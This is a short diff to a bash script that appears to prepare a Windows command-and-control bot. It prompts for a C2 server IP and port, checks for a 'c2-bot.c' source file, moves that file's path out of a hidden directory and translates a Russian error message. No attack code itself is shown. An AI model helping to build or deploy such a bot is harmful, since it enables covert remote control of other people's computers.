@@ -1,13 +1,13 @@
 # !/bin/bash
 
 HOME="$(git rev-parse --show-toplevel)"
-FILE="$HOME/.sys/windows/c2-bot.c"
+FILE="$HOME/sys/windows/c2-bot.c"
 
 read -p "Write IP Address server: " IP
 read -p "Write PORT Address server: " PORT
 
 if [ ! -f "$FILE" ]; then
-    echo "Файл $FILE не найден!"
+    echo "File $FILE not found!"
     exit 1
 fi
 
